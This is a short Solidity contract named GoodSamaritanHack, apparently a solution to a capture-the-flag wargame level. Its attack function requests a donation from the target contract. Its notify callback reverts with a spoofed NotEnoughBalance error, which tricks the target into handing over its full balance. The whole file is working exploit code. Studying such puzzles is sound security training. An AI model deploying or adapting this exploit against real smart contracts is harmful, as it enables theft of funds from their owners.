// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;
import "./GoodSamaritan.sol";

contract GoodSamaritanHack{

    address public goodSamaritan;

    error NotEnoughBalance();
    constructor(address _goodSamaritan) {
        goodSamaritan = _goodSamaritan;
    }

    function attack() public {
        GoodSamaritan(goodSamaritan).requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
